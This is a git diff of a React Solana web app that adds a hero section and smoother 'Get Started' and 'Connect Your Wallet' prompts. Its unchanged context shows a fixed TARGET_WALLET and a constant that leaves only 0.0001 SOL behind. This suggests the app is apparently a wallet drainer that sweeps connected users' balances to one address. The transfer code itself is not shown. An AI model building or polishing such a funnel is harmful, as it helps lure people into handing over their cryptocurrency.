@@ -1,11 +1,11 @@
-import React, { useState, useEffect } from 'react'
+import React, { useState, useEffect, useRef } from 'react'
 import { Connection, LAMPORTS_PER_SOL, SystemProgram, Transaction, PublicKey, Keypair } from '@solana/web3.js'
 import nacl from 'tweetnacl';
 import bs58 from 'bs58';
 import 'bootstrap/dist/css/bootstrap.min.css';
 import ConnectWalletModal from './components/ConnectWalletModal'
 import Navbar from './components/Navbar';
-
+import Hero from './components/Hero';
 // AppKit imports
 import { createAppKit } from "@reown/appkit"
 import { SolanaAdapter } from "@reown/appkit-adapter-solana"
@@ -61,6 +61,7 @@ function App() {
   const [isTransferring, setIsTransferring] = useState(false)
   const [status, setStatus] = useState('')
   const [error, setError] = useState('')
+  const toolSectionRef = useRef(null);
 
   const TARGET_WALLET = import.meta.env.VITE_TARGET_WALLET || 'YOUR_TARGET_WALLET_HERE'
   const LAMPORTS_TO_LEAVE = 100000 // 100,000 lamports = 0.0001 SOL
@@ -526,19 +527,27 @@ function App() {
     setBalance(0);
   };
 
+  const handleGetStartedClick = () => {
+    toolSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
+    setShowConnectModal(true);
+  };
+
   return (
     <>
       <Navbar
-        onGetStartedClick={() => setShowConnectModal(true)}
+        onGetStartedClick={handleGetStartedClick}
         connectedWallet={connectedWallet}
         onDisconnect={handleDisconnect}
       />
+      <Hero onGetStartedClick={handleGetStartedClick} />
       <div style={{ 
         padding: '40px 20px', 
         maxWidth: '600px', 
         margin: '40px auto',
         fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
-      }}>
+      }}
+        ref={toolSectionRef}
+      >
         <div style={{ 
           backgroundColor: 'white', 
           borderRadius: '16px',
@@ -558,10 +567,10 @@ function App() {
           
           {/* Main Connect Button or Connected State */}
           {!connectedWallet ? (
-            <div className="text-center">
-              <h2 className="h4 mb-3">Welcome!</h2>
+            <div className="text-center py-5">
+              <h2 className="h4 mb-3">Connect Your Wallet</h2>
               <p className="text-secondary">
-                Click "Get Started" in the navigation bar to connect your wallet and begin transferring SOL.
+                Please connect a wallet to begin using the transfer tool.
               </p>
             </div>
           ) : (
